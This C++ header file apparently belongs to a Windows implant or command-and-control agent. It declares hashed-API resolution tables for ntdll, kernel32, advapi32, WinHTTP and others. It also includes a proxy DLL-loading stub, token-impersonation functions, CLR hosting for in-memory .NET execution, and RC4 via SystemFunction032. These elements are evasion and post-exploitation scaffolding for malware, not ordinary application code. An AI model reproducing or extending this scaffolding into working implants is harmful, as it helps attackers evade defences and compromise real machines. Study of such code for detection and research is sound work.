#pragma once
#include "Syscalls.hpp"
#include "NetworkAdapters.hpp"
#include <winhttp.h>
#include <tlhelp32.h>
#include <oleauto.h>

struct ModuleDetails;
class SecureString;

typedef struct _WIN32API {
    PVOID pAddress;
    DWORD dwCryptedHash;
} WIN32API, * PWIN32API;

typedef struct _NTDLL_TABLE {
    WIN32API pLdrLoadDll;
    WIN32API pRtlInitUnicodeString;
    WIN32API pRtlCreateEnvironment;
    WIN32API pRtlAllocateHeap;
    WIN32API pRtlReAllocateHeap;
    WIN32API pRtlFreeHeap;
    WIN32API pRtlCreateHeap;
    WIN32API pRtlDestroyHeap;
    WIN32API pRtlWalkHeap;
    WIN32API pRtlCopyMemory;
    WIN32API pRtlZeroMemory;
    WIN32API pRtlSecureZeroMemory;
    WIN32API pRtlCreateProcessParametersEx;
    WIN32API pRtlCreateUserThread;
    WIN32API pCsrClientCallServer;
    WIN32API pCsrCaptureMessageMultiUnicodeStringsInPlace;    
    WIN32API pRtlExitUserProcess;
    WIN32API pNtContinue;
    WIN32API pNtDelayExecution;
    WIN32API pNtWaitForSingleObject;
    WIN32API pRtlInitializeCriticalSection;
    WIN32API pRtlEnterCriticalSection;
    WIN32API pRtlLeaveCriticalSection;
    WIN32API pTpAllocPool;
    WIN32API pTpSetPoolMaxThreads;
    WIN32API pTpSetPoolMinThreads;
    WIN32API pTpReleasePool;
    WIN32API pTpAllocTimer;
    WIN32API pTpSetTimer;
    WIN32API pTpReleaseTimer;
    WIN32API pTpAllocWork;
    WIN32API pTpPostWork;
    WIN32API pTpReleaseWork;
    WIN32API pRtlAddVectoredExceptionHandler;
    WIN32API pRtlRemoveVectoredExceptionHandler;
    BOOL isResolved;
} NTDLL_TABLE, * PNTDLL_TABLE;

typedef struct _KERNEL32_TABLE {
    WIN32API pCreatePipe;
    WIN32API pCreateProcessA;
    WIN32API pCreateFiber;
    WIN32API pSwitchToFiber;
    WIN32API pDeleteFiber;
    WIN32API pPeekNamedPipe;
    WIN32API pConvertThreadToFiber;
    WIN32API pCreateToolhelp32Snapshot;
    WIN32API pProcess32First;
    WIN32API pProcess32Next;
    WIN32API pThread32First;
    WIN32API pThread32Next;
    WIN32API pCreateFileMappingA;
    WIN32API pMapViewOfFile;
    WIN32API pCreateEventA;
    WIN32API pGetTickCount;
    WIN32API pVirtualAlloc;
    WIN32API pLoadLibraryA;
    WIN32API pSetStdHandle;
    WIN32API pGetStdHandle;
    WIN32API pGetConsoleWindow;
    WIN32API pAllocConsole;
    WIN32API pWriteFile;
    WIN32API pReadFile;
    WIN32API pWaitForSingleObject;
    WIN32API pGetCommandLineW;
    WIN32API pGetLastError;
    WIN32API pHeapWalk;
    WIN32API pVirtualProtect;
    WIN32API pExitThread;
    WIN32API pExitProcess;
    WIN32API pFindResourceW;
    WIN32API pLoadResource;
    WIN32API pSizeofResource;
    WIN32API pLockResource;
    WIN32API pHeapAlloc;
    WIN32API pGetProcessHeap;
    WIN32API pGetModuleHandleExA;
    WIN32API pGetModuleBaseNameA;
    BOOL isResolved;
} KERNEL32_TABLE, * PKERNEL32_TABLE;

typedef struct _ADVAPI32_TABLE {
    WIN32API pGetSidSubAuthority;
    WIN32API pLookupAccountSidA;
    WIN32API pLookupPrivilegeValueA;
    WIN32API pImpersonateLoggedOnUser;
    WIN32API pCreateProcessWithTokenW;
    BOOL isResolved;
} ADVAPI32_TABLE, * PADVAPI32_TABLE;

typedef struct _USER32_TABLE {
    WIN32API pShowWindow;
    WIN32API pEnumThreadWindows;
    BOOL isResolved;
} USER32_TABLE, * PUSER32_TABLE;

typedef struct _SHELL32_TABLE {
    WIN32API pCommandLineToArgvW;
    BOOL isResolved;
} SHELL32_TABLE, * PSHELL32_TABLE;

typedef struct _WINHTTP_TABLE {
    WIN32API pWinHttpCloseHandle;
    WIN32API pWinHttpConnect;
    WIN32API pWinHttpOpen;
    WIN32API pWinHttpOpenRequest;
    WIN32API pWinHttpQueryDataAvailable;
    WIN32API pWinHttpReadData;
    WIN32API pWinHttpReceiveResponse;
    WIN32API pWinHttpSendRequest;
    WIN32API pWinHttpWriteData;
    WIN32API pWinHttpQueryHeaders;
    WIN32API pWinHttpSetOption;
    BOOL isResolved;
} WINHTTP_TABLE, * PWINHTTP_TABLE;

typedef struct _MSCOREE_TABLE {
    WIN32API pCLRCreateInstance;
    BOOL isResolved;
} MSCOREE_TABLE, * PMSCOREE_TABLE;

typedef struct _OLEAUT32_TABLE {
    WIN32API pSafeArrayCreate;
    WIN32API pSafeArrayAccessData;
    WIN32API pSafeArrayUnaccessData;
    WIN32API pSafeArrayCreateVector;
    WIN32API pSafeArrayPutElement;
    WIN32API pSysAllocString;
    BOOL isResolved;
} OLEAUT32_TABLE, * POLEAUT32_TABLE;

typedef struct _WINSOCK_TABLE {
    WIN32API pWSAStartup;
    WIN32API pWSACleanup;
    WIN32API pinet_ntop;
    BOOL isResolved;
} WINSOCK_TABLE, * PWINSOCK_TABLE;

typedef struct _KERNELBASE_TABLE {
	WIN32API pBaseGetNamedObjectDirectory;
	BOOL isResolved;
} KERNELBASE_TABLE, * PKERNELBASE_TABLE;

typedef struct _CRYPTSP_TABLE {
    WIN32API pSystemFunction032;
    BOOL isResolved;
} CRYPTSP_TABLE, * PCRYPTSP_TABLE;

typedef struct _IPHLPAPI_TABLE {
    WIN32API pGetAdaptersAddresses;
    BOOL isResolved;
} IPHLPAPI_TABLE, * PIPHLPAPI_TABLE;

// Proxy DLL load structure
typedef struct _PROXY_LOAD_PARAMS {
	const char* dllName;
	PVOID pLoadLibraryA;
} PROXY_LOAD_PARAMS, * PPROXY_LOAD_PARAMS;

// External assembly function for proxy DLL loading
extern "C" void CALLBACK ExtractAndJump(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_TIMER Timer);

// BEGIN WIN32 HASHES DON'T REMOVE
// NTDLL
#define LDRLOADDLL_HASH 0x2347eb3a
#define RTLINITUNICODESTRING_HASH 0x9f76f90
#define RTLCREATEENVIRONMENT_HASH 0x1c739f99
#define RTLALLOCATEHEAP_HASH 0xe0f3b1c3
#define RTLREALLOCATEHEAP_HASH 0x9b894908
#define RTLFREEHEAP_HASH 0x50fa41ce
#define RTLCREATEHEAP_HASH 0x8feaf190
#define RTLDESTROYHEAP_HASH 0x7e0d09e6
#define RTLWALKHEAP_HASH 0x357c0b7d
#define RTLCOPYMEMORY_HASH 0x75dabc92
#define RTLZEROMEMORY_HASH 0xdc2e46a9
#define RTLSECUREZEROMEMORY_HASH 0x7bfb3a0e
#define RTLCREATEPROCESSPARAMETERSEX_HASH 0x39531ca2
#define RTLCREATEUSERTHREAD_HASH 0xea80d51b
#define CSRCLIENTCALLSERVER_HASH 0x3e2b3f86
#define CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE_HASH 0x9208787
#define RTLEXITUSERPROCESS_HASH 0x1ae1c0f6
#define NTDELAYEXECUTION_HASH 0x2a093853
#define NTWAITFORSINGLEOBJECT_HASH 0x6c2df625
#define NTCONTINUE_HASH 0x584a5135
#define RTLINITIALIZECRITICALSECTION_HASH 0xb1291e10
#define RTLENTERCRITICALSECTION_HASH 0xb4e96e4c
#define RTLLEAVECRITICALSECTION_HASH 0x486ea7fd
#define TPALLOCPOOL_HASH 0x153e8e37
#define TPSETPOOLMAXTHREADS_HASH 0xafba3a39
#define TPSETPOOLMINTHREADS_HASH 0xd90b7147
#define TPRELEASEPOOL_HASH 0xeb1ccd9d
#define TPALLOCTIMER_HASH 0xc5dba2ac
#define TPSETTIMER_HASH 0xac2affcf
#define TPRELEASETIMER_HASH 0x17018cd2
#define TPALLOCWORK_HASH 0x15c2a52e
#define TPPOSTWORK_HASH 0xe90ff38b
#define TPRELEASEWORK_HASH 0xeb20e494
#define RTLADDVECTOREDEXCEPTIONHANDLER_HASH 0x750b9fb0
#define RTLREMOVEVECTOREDEXCEPTIONHANDLER_HASH 0xa84c1117
// KERNEL32
#define CREATEPIPE_HASH 0xbacddefe
#define CREATEPROCESSA_HASH 0x8ef51e00
#define CREATEFIBER_HASH 0xcbd6abb8
#define SWITCHTOFIBER_HASH 0xe290ae1b
#define DELETEFIBER_HASH 0x3c986cd9
#define PEEKNAMEDPIPE_HASH 0xb4b0bb84
#define CONVERTTHREADTOFIBER_HASH 0xe1680af0
#define CREATETOOLHELP32SNAPSHOT_HASH 0x46c5228c
#define PROCESS32FIRST_HASH 0xb2388868
#define PROCESS32NEXT_HASH 0xb0574f31
#define THREAD32FIRST_HASH 0xb344aa53
#define THREAD32NEXT_HASH 0x491239f8
#define CREATEFILEMAPPINGA_HASH 0xd37fcc9f
#define MAPVIEWOFFILE_HASH 0x319e80aa
#define CREATEEVENTA_HASH 0x7d41c185
#define GETTICKCOUNT_HASH 0x61ed26a0
#define VIRTUALALLOC_HASH 0x186c3f8e
#define LOADLIBRARYA_HASH 0x7fffc0e2
#define SETSTDHANDLE_HASH 0x1ca0d4d1
#define GETSTDHANDLE_HASH 0xd138b425
#define GETCONSOLEWINDOW_HASH 0xc19b1409
#define ALLOCCONSOLE_HASH 0xed9b4fda
#define WRITEFILE_HASH 0x467cdca9
#define READFILE_HASH 0x5141a938
#define WAITFORSINGLEOBJECT_HASH 0xcc8d91a3
#define GETCOMMANDLINEW_HASH 0x9551cc7a
#define GETLASTERROR_HASH 0xc2dafa
#define HEAPWALK_HASH 0x1711aecb
#define VIRTUALPROTECT_HASH 0xa40fc194
#define EXITTHREAD_HASH 0x5a8b644e
#define EXITPROCESS_HASH 0x97290387
#define FINDRESOURCEW_HASH 0x1c307e5c
#define LOADRESOURCE_HASH 0xfc9e6954
#define SIZEOFRESOURCE_HASH 0x2c579844
#define LOCKRESOURCE_HASH 0x341aa28f
#define HEAPALLOC_HASH 0x3fbd5717
#define GETPROCESSHEAP_HASH 0xe6183d1b
#define GETMODULEHANDLEEXA_HASH 0x1422a60c
#define K32GETMODULEBASENAMEA_HASH 0xd0e8ff21
// ADVAPI32
#define GETSIDSUBAUTHORITY_HASH 0xc5cb80a1
#define LOOKUPACCOUNTSIDA_HASH 0x9c11bd34
#define LOOKUPPRIVILEGEVALUEA_HASH 0x9bee5e9d
#define IMPERSONATELOGGEDONUSER_HASH 0x86bfe543
#define CREATEPROCESSWITHTOKENW_HASH 0xb4a75e55
// USER32
#define SHOWWINDOW_HASH 0xc3617607
#define ENUMTHREADWINDOWS_HASH 0x815fe824
// SHELL32
#define COMMANDLINETOARGVW_HASH 0xad20426f
// WINHTTP
#define WINHTTPCLOSEHANDLE_HASH 0x16623ccc
#define WINHTTPCONNECT_HASH 0x5202f164
#define WINHTTPOPEN_HASH 0x7e0f09fc
#define WINHTTPOPENREQUEST_HASH 0xcaf789d7
#define WINHTTPQUERYDATAAVAILABLE_HASH 0x148bb69d
#define WINHTTPREADDATA_HASH 0x51d5d4f0
#define WINHTTPRECEIVERESPONSE_HASH 0x342c793c
#define WINHTTPSENDREQUEST_HASH 0x91c3cabf
#define WINHTTPWRITEDATA_HASH 0x59c1da21
#define WINHTTPQUERYHEADERS_HASH 0x18dcdfbc
#define WINHTTPSETOPTION_HASH 0x81cba4e1
// MSCOREE
#define CLRCREATEINSTANCE_HASH 0xf6496616
// OLEAUT32
#define SAFEARRAYCREATE_HASH 0x20b8018e
#define SAFEARRAYACCESSDATA_HASH 0x9d69e136
#define SAFEARRAYUNACCESSDATA_HASH 0xe095052b
#define SAFEARRAYCREATEVECTOR_HASH 0xd86a6d93
#define SAFEARRAYPUTELEMENT_HASH 0xa24d77f
#define SYSALLOCSTRING_HASH 0x581658bf
// WINSOCK
#define WSASTARTUP_HASH 0x4168f69a
#define WSACLEANUP_HASH 0x5f5a9b61
#define INET_NTOP_HASH 0x91f6138c
// KERNELBASE
#define BASEGETNAMEDOBJECTDIRECTORY_HASH 0x8db06188
// CRYPTSP
#define SYSTEMFUNCTION032_HASH 0xec8f059c
// IPHLPAPI
#define GETADAPTERSADDRESSES_HASH 0x60d8bb8e
// END WIN32 HASHES DON'T REMOVE

// Function definitions - start with native (ntdll)
typedef NTSTATUS(NTAPI* pLdrLoadDll)(
    IN PWSTR SearchPath OPTIONAL,
    IN PULONG DllCharacteristics OPTIONAL,
    IN PUNICODE_STRING DllName,
    OUT PVOID* BaseAddress);

typedef VOID(NTAPI* pRtlInitUnicodeString)(
    OUT PUNICODE_STRING DestinationString,
    IN PCWSTR SourceString);

typedef NTSTATUS(NTAPI* pRtlCreateEnvironment)(
    IN BOOLEAN CloneCurrentEnvironment OPTIONAL,
    OUT PVOID* Environment);

typedef PVOID(NTAPI* pRtlAllocateHeap)(
    IN PVOID HeapHandle,
    IN ULONG Flags OPTIONAL,
    IN SIZE_T Size);

typedef PVOID(NTAPI* pRtlReAllocateHeap)(
    IN HANDLE HeapHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN SIZE_T Size);

typedef BOOL(NTAPI* pRtlFreeHeap)(
    IN PVOID HeapHandle,
    IN ULONG Flags OPTIONAL,
    IN PVOID BaseAddress);

typedef PVOID(NTAPI* pRtlCreateHeap)(
    IN ULONG Flags,
    IN PVOID HeapBase OPTIONAL,
    IN SIZE_T ReserveSize OPTIONAL,
    IN SIZE_T CommitSize OPTIONAL,
    IN PVOID Lock OPTIONAL,
    IN PRTL_HEAP_PARAMETERS Parameters OPTIONAL);

typedef PVOID(NTAPI* pRtlDestroyHeap)(
    IN PVOID HeapHandle);

typedef NTSTATUS(NTAPI* pRtlWalkHeap)(
	IN PVOID HeapHandle,
	IN OUT PRTL_HEAP_WALK_ENTRY Entry);

typedef void (NTAPI* pRtlZeroMemory)(
    OUT void* Destination,
    IN size_t Length);

typedef void (NTAPI* pRtlCopyMemory)(
    OUT void* Destination,
    IN const void* Source,
    IN size_t Length);

typedef NTSTATUS(NTAPI* pRtlCreateProcessParametersEx)(
    OUT PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    IN PUNICODE_STRING ImagePathName,
    IN PUNICODE_STRING DllPath OPTIONAL,
    IN PUNICODE_STRING CurrentDirectory OPTIONAL,
    IN PUNICODE_STRING CommandLine OPTIONAL,
    IN PVOID Environment OPTIONAL,
    IN PUNICODE_STRING WindowTitle OPTIONAL,
    IN PUNICODE_STRING DesktopInfo OPTIONAL,
    IN PUNICODE_STRING ShellInfo OPTIONAL,
    IN PUNICODE_STRING RuntimeData OPTIONAL,
    IN ULONG Flags);

typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(
    IN HANDLE Process,
    IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG ZeroBits OPTIONAL,
    IN SIZE_T MaximumStackSize OPTIONAL,
    IN SIZE_T CommittedStackSize OPTIONAL,
    IN PUSER_THREAD_START_ROUTINE StartAddress,
    IN PVOID Parameter OPTIONAL,
    OUT PHANDLE Thread OPTIONAL,
    OUT PCLIENT_ID ClientId OPTIONAL);

typedef NTSTATUS(NTAPI* pCsrClientCallServer)(
    IN PBASE_API_MSG ApiMessage,
    IN PCSR_CAPTURE_BUFFER CaptureBuffer,
    IN ULONG ApiNumber,
    IN ULONG DataLength);

typedef NTSTATUS(NTAPI* pCsrCaptureMessageMultiUnicodeStringsInPlace)(
    OUT PCSR_CAPTURE_BUFFER* pCaptureBuffer,
    IN ULONG StringsCount,
    IN PUNICODE_STRING* MessageStrings);

typedef VOID (NTAPI* pRtlExitUserProcess)(
    IN NTSTATUS ExitStatus);

typedef NTSTATUS(NTAPI* pNtDelayExecution)(
    BOOLEAN Alertable,
    PLARGE_INTEGER DelayInterval);

typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);

typedef NTSTATUS(NTAPI* pNtContinue)(
    PCONTEXT ContextRecord,
    BOOLEAN TestAlert);

typedef NTSTATUS(NTAPI* pRtlInitializeCriticalSection)(
    PCRITICAL_SECTION CriticalSection);

typedef NTSTATUS(NTAPI* pRtlEnterCriticalSection)(
    PCRITICAL_SECTION CriticalSection);

typedef NTSTATUS(NTAPI* pRtlLeaveCriticalSection)(
    PCRITICAL_SECTION CriticalSection);

typedef NTSTATUS(NTAPI* pTpAllocPool)(
    _Out_ PTP_POOL* PoolReturn,
    _Reserved_ PVOID Reserved);

typedef NTSTATUS(NTAPI* pTpSetPoolMaxThreads)(
    _Inout_ PTP_POOL Pool,
    _In_ LONG MaxThreads);

typedef NTSTATUS(NTAPI* pTpSetPoolMinThreads)(
    _Inout_ PTP_POOL Pool,
    _In_ LONG MinThreads);

typedef NTSTATUS(NTAPI* pTpReleasePool)(
    _Inout_ PTP_POOL Pool);

typedef NTSTATUS(NTAPI* pTpAllocTimer)(
    _Out_ PTP_TIMER* Timer,
    _In_ PTP_TIMER_CALLBACK Callback,
    _Inout_opt_ PVOID Context,
    _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron);

typedef NTSTATUS(NTAPI* pTpSetTimer)(
    _Inout_ PTP_TIMER Timer,
    _In_opt_ PLARGE_INTEGER DueTime,
    _In_ LONG Period,
    _In_opt_ LONG WindowLength);

typedef NTSTATUS(NTAPI* pTpReleaseTimer)(
    _Inout_ PTP_TIMER Timer);

typedef NTSTATUS(NTAPI* pTpPostWork)(
    _Inout_ PTP_WORK Work);

typedef NTSTATUS(NTAPI* pTpReleaseWork)(
    _Inout_ PTP_WORK Work);

typedef NTSTATUS(NTAPI* pTpAllocWork)(
    _Out_ PTP_WORK* WorkReturn,
    _In_ PTP_WORK_CALLBACK WorkCallback,
    _Inout_opt_ PVOID WorkContext,
    _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron);

typedef PVOID(WINAPI* pRtlAddVectoredExceptionHandler)(
    IN ULONG FirstHandler,
    IN PVECTORED_EXCEPTION_HANDLER VectoredHandler);

typedef ULONG(WINAPI* pRtlRemoveVectoredExceptionHandler)(
    IN PVOID Handle);

FORCEINLINE
VOID
MyTpInitializeCallbackEnviron(
    _Out_ PTP_CALLBACK_ENVIRON CallbackEnviron
)
{

#if (_WIN32_WINNT >= _WIN32_WINNT_WIN7)

    CallbackEnviron->Version = 3;

#else

    CallbackEnviron->Version = 1;

#endif

    CallbackEnviron->Pool = NULL;
    CallbackEnviron->CleanupGroup = NULL;
    CallbackEnviron->CleanupGroupCancelCallback = NULL;
    CallbackEnviron->RaceDll = NULL;
    CallbackEnviron->ActivationContext = NULL;
    CallbackEnviron->FinalizationCallback = NULL;
    CallbackEnviron->u.Flags = 0;

#if (_WIN32_WINNT >= _WIN32_WINNT_WIN7)

    CallbackEnviron->CallbackPriority = TP_CALLBACK_PRIORITY_NORMAL;
    CallbackEnviron->Size = sizeof(TP_CALLBACK_ENVIRON);

#endif

}

FORCEINLINE
VOID
MyTpSetCallbackThreadpool(
    _Inout_ PTP_CALLBACK_ENVIRON CallbackEnviron,
    _In_    PTP_POOL             Pool
)
{
    CallbackEnviron->Pool = Pool;
}

// Kernel32
typedef BOOL(WINAPI* pCreatePipe)(
    OUT PHANDLE hReadPipe,
    OUT PHANDLE hWritePipe,
    IN LPSECURITY_ATTRIBUTES lpPipeAttributes OPTIONAL,
    IN DWORD nSize);

typedef BOOL(WINAPI* pCreateProcessA)(
    IN LPCSTR                 lpApplicationName OPTIONAL,
    IN OUT LPSTR              lpCommandLine OPTIONAL,
    IN LPSECURITY_ATTRIBUTES  lpProcessAttributes OPTIONAL,
    IN LPSECURITY_ATTRIBUTES  lpThreadAttributes OPTIONAL,
    IN BOOL                   bInheritHandles,
    IN DWORD                  dwCreationFlags,
    IN LPVOID                 lpEnvironment OPTIONAL,
    IN LPCSTR                 lpCurrentDirectory OPTIONAL,
    IN LPSTARTUPINFOA         lpStartupInfo,
    OUT LPPROCESS_INFORMATION lpProcessInformation);

typedef LPVOID(WINAPI* pCreateFiber)(
    IN SIZE_T dwStackSize,
    IN LPFIBER_START_ROUTINE lpStartAddress,
    IN LPVOID lpParameter OPTIONAL);

typedef void (WINAPI* pSwitchToFiber)(
    IN LPVOID lpFiber);

typedef void (WINAPI* pDeleteFiber)(
    IN LPVOID lpFiber);

typedef BOOL(WINAPI* pPeekNamedPipe)(
    IN HANDLE hNamedPipe,
    OUT LPVOID lpBuffer OPTIONAL,
    IN DWORD nBufferSize,
    OUT LPDWORD lpBytesRead OPTIONAL,
    OUT LPDWORD lpTotalBytesAvail OPTIONAL,
    OUT LPDWORD lpBytesLeftThisMessage OPTIONAL);

typedef LPVOID(WINAPI* pConvertThreadToFiber)(
    IN LPVOID lpParameter OPTIONAL);

typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot)(
    IN DWORD dwFlags,
    IN DWORD th32ProcessID);

typedef BOOL(WINAPI* pProcess32Next)(
    IN HANDLE hSnapshot,
    OUT LPPROCESSENTRY32 lppe);

typedef BOOL(WINAPI* pProcess32First)(
    IN HANDLE hSnapshot,
    IN OUT LPPROCESSENTRY32 lppe);

typedef BOOL(WINAPI* pThread32Next)(
    IN HANDLE hSnapshot,
    OUT LPTHREADENTRY32 lpte);

typedef BOOL(WINAPI* pThread32First)(
    IN HANDLE hSnapshot,
    IN OUT LPTHREADENTRY32 lpte);

typedef HANDLE(WINAPI* pCreateFileMappingA)(
    IN HANDLE hFile,
    IN LPSECURITY_ATTRIBUTES lpFileMappingAttributes OPTIONAL,
    IN DWORD flProtect,
    IN DWORD dwMaximumSizeHigh,
    IN DWORD dwMaximumSizeLow,
    IN LPCSTR lpName OPTIONAL);

typedef LPVOID(WINAPI* pMapViewOfFile)(
    IN HANDLE hFileMappingObject,
    IN DWORD  dwDesiredAccess,
    IN DWORD  dwFileOffsetHigh,
    IN DWORD  dwFileOffsetLow,
    IN SIZE_T dwNumberOfBytesToMap);

typedef DWORD(WINAPI* pGetTickCount)();

typedef HANDLE(WINAPI* pCreateEventA)(
    IN LPSECURITY_ATTRIBUTES lpEventAttributes OPTIONAL,
    IN BOOL bManualReset,
    IN BOOL bInitialState,
    IN LPCSTR lpName OPTIONAL);

typedef LPVOID(WINAPI* pVirtualAlloc)(
    IN LPVOID lpAddress OPTIONAL,
    IN SIZE_T dwSize,
    IN DWORD  flAllocationType,
    IN DWORD  flProtect);

typedef HMODULE(WINAPI* pLoadLibraryA)(
    IN LPCSTR lpLibFileName);

typedef BOOL(WINAPI* pSetStdHandle)(
    IN DWORD  nStdHandle,
    IN HANDLE hHandle);

typedef HANDLE(WINAPI* pGetStdHandle)(
    IN DWORD nStdHandle);

typedef HWND(WINAPI* pGetConsoleWindow)(void);

typedef BOOL(WINAPI* pAllocConsole)(void);

typedef BOOL(WINAPI* pWriteFile)(
    IN HANDLE hFile,
    IN LPCVOID lpBuffer,
    IN DWORD nNumberOfBytesToWrite,
    OUT LPDWORD lpNumberOfBytesWritten OPTIONAL,
    IN OUT LPOVERLAPPED lpOverlapped OPTIONAL);

typedef BOOL(WINAPI* pReadFile)(
    IN HANDLE hFile,
    OUT LPVOID lpBuffer,
    IN DWORD nNumberOfBytesToRead,
    OUT LPDWORD lpNumberOfBytesRead OPTIONAL,
    IN OUT LPOVERLAPPED lpOverlapped OPTIONAL);

typedef DWORD(WINAPI* pWaitForSingleObject)(
    IN HANDLE hHandle,
    IN DWORD  dwMilliseconds);

typedef LPWSTR(WINAPI* pGetCommandLineW)();

typedef DWORD(WINAPI* pGetLastError)(void);

typedef BOOL(WINAPI* pHeapWalk)(
	IN HANDLE hHeap,
	IN OUT LPPROCESS_HEAP_ENTRY lpEntry);

typedef BOOL(WINAPI* pVirtualProtect)(
	IN LPVOID lpAddress,
	IN SIZE_T dwSize,
	IN DWORD  flNewProtect,
	OUT PDWORD lpflOldProtect);

typedef void (WINAPI* pExitThread)(
    IN DWORD dwExitCode);

typedef void (WINAPI* pExitProcess)(
    IN UINT uExitCode);

typedef HRSRC (WINAPI* pFindResourceW)(
    IN HMODULE hModule OPTIONAL,
    IN LPCWSTR lpName,
    IN LPCWSTR lpType);

typedef HGLOBAL (WINAPI* pLoadResource)(
    IN HMODULE hModule OPTIONAL,
    IN HRSRC   hResInfo);

typedef DWORD (WINAPI* pSizeofResource)(
    IN HMODULE hModule OPTIONAL,
    IN HRSRC   hResInfo);

typedef LPVOID(WINAPI* pLockResource)(
    IN HGLOBAL hResData);

typedef LPVOID (WINAPI* pHeapAlloc)(
    IN HANDLE hHeap,
    IN DWORD  dwFlags,
    IN SIZE_T dwBytes);

typedef HANDLE(WINAPI* pGetProcessHeap)();

typedef BOOL(WINAPI* pGetModuleHandleExA)(
	IN DWORD  dwFlags,
	IN LPCSTR lpModuleName,
	OUT HMODULE* phModule);

typedef DWORD(WINAPI* pGetModuleBaseNameA)(
	IN HANDLE hProcess,
	IN HMODULE hModule OPTIONAL,
	OUT LPSTR lpBaseName,
	IN DWORD nSize);

// AdvApi32

typedef PDWORD(WINAPI* pGetSidSubAuthority)(
    IN PSID  pSid,
    IN DWORD nSubAuthority);

typedef BOOL(WINAPI* pLookupAccountSidA)(
    IN LPCSTR lpSystemName OPTIONAL,
    IN PSID Sid,
    OUT LPSTR Name OPTIONAL,
    IN OUT LPDWORD cchName,
    OUT LPSTR ReferencedDomainName OPTIONAL,
    IN OUT LPDWORD cchReferencedDomainName,
    OUT PSID_NAME_USE peUse);

typedef BOOL(WINAPI* pLookupPrivilegeValueA)(
    IN LPCSTR lpSystemName OPTIONAL,
    IN LPCSTR lpName,
    OUT PLUID lpLuid);

typedef BOOL(WINAPI* pImpersonateLoggedOnUser)(
    IN HANDLE hToken);

typedef BOOL(WINAPI* pCreateProcessWithTokenW)(
    IN HANDLE hToken,
    IN DWORD dwLogonFlags,
    IN LPCWSTR lpApplicationName OPTIONAL,
    IN OUT LPWSTR lpCommandLine OPTIONAL,
    IN DWORD dwCreationFlags,
    IN LPVOID lpEnvironment OPTIONAL,
    IN LPCWSTR lpCurrentDirectory OPTIONAL,
    IN LPSTARTUPINFOW lpStartupInfo,
    OUT LPPROCESS_INFORMATION lpProcessInformation);

// User32

typedef BOOL(WINAPI* pShowWindow)(
    IN HWND hWnd,
    IN int nCmdShow);

typedef BOOL(WINAPI* pEnumThreadWindows)(
    IN DWORD dwThreadId,
    IN WNDENUMPROC lpfn,
    IN LPARAM lParam);

// Shell32

typedef LPWSTR* (WINAPI* pCommandLineToArgvW)(
    IN LPCWSTR lpCmdLine,
    OUT int* pNumArgs);

// WinHttp

typedef BOOL(*pWinHttpCloseHandle)(
    HINTERNET hInternet);

typedef HINTERNET(*pWinHttpConnect)(
    HINTERNET     hSession,
    LPCWSTR       pswzServerName,
    INTERNET_PORT nServerPort,
    DWORD         dwReserved);

typedef HINTERNET(*pWinHttpOpen)(
    LPCWSTR pszAgentW OPTIONAL,
    DWORD   dwAccessType,
    LPCWSTR pszProxyW,
    LPCWSTR pszProxyBypassW,
    DWORD   dwFlags);

typedef HINTERNET(*pWinHttpOpenRequest)(
    HINTERNET hConnect,
    LPCWSTR   pwszVerb,
    LPCWSTR   pwszObjectName,
    LPCWSTR   pwszVersion,
    LPCWSTR   pwszReferrer,
    LPCWSTR* ppwszAcceptTypes,
    DWORD     dwFlags);

typedef BOOL(*pWinHttpQueryDataAvailable)(
    HINTERNET hRequest,
    LPDWORD   lpdwNumberOfBytesAvailable);

typedef BOOL(*pWinHttpReadData)(
    HINTERNET hRequest,
    LPVOID    lpBuffer,
    DWORD     dwNumberOfBytesToRead,
    LPDWORD   lpdwNumberOfBytesRead);

typedef BOOL(*pWinHttpReceiveResponse)(
    HINTERNET hRequest,
    LPVOID    lpReserved);

typedef BOOL(*pWinHttpSendRequest)(
    HINTERNET hRequest,
    LPCWSTR   lpszHeaders OPTIONAL,
    DWORD     dwHeadersLength,
    LPVOID    lpOptional OPTIONAL,
    DWORD     dwOptionalLength,
    DWORD     dwTotalLength,
    DWORD_PTR dwContext);

typedef BOOL(*pWinHttpWriteData)(
    HINTERNET hRequest,
    LPCVOID   lpBuffer,
    DWORD     dwNumberOfBytesToWrite,
    LPDWORD   lpdwNumberOfBytesWritten);

typedef BOOL(*pWinHttpQueryHeaders)(
    IN           HINTERNET hRequest,
    IN           DWORD     dwInfoLevel,
    IN LPCWSTR   pwszName OPTIONAL,
    OUT          LPVOID    lpBuffer,
    IN OUT      LPDWORD   lpdwBufferLength,
    IN OUT      LPDWORD   lpdwIndex);

typedef BOOL (*pWinHttpSetOption)(
    IN HINTERNET hInternet,
    IN DWORD     dwOption,
    IN LPVOID    lpBuffer,
    IN DWORD     dwBufferLength
);

// MSCOREE

typedef HRESULT(WINAPI* pCLRCreateInstance)(
    IN  REFCLSID  clsid,
    IN  REFIID     riid,
    OUT LPVOID* ppInterface);
/*IN GUID * clsid,
IN GUID * riid,
OUT PICLRMetaHost * ppInterface);*/

// OLEAUT32

typedef SAFEARRAY* (WINAPI* pSafeArrayCreate)(
    IN VARTYPE vt,
    IN UINT cDims,
    IN SAFEARRAYBOUND* rgsabound);

typedef HRESULT(WINAPI* pSafeArrayAccessData)(
    IN  SAFEARRAY* psa,
    OUT void HUGEP** ppvData);

typedef HRESULT(WINAPI* pSafeArrayUnaccessData)(
    IN SAFEARRAY* psa);

typedef SAFEARRAY* (WINAPI* pSafeArrayCreateVector)(
    IN VARTYPE vt,
    IN LONG lLbound,
    IN ULONG cElements);

typedef HRESULT(WINAPI* pSafeArrayPutElement)(
    IN SAFEARRAY* psa,
    IN LONG* rgIndices,
    IN void* pv);

typedef BSTR(WINAPI* pSysAllocString)(
    IN const OLECHAR* psz OPTIONAL);

// WINSOCK

#define WSAAPI                  FAR PASCAL

typedef int (WSAAPI* pWSAStartup)(
    WORD wVersionRequested, 
    LPWSADATA lpWSAData);

typedef int (WSAAPI* pWSACleanup)(
    void);

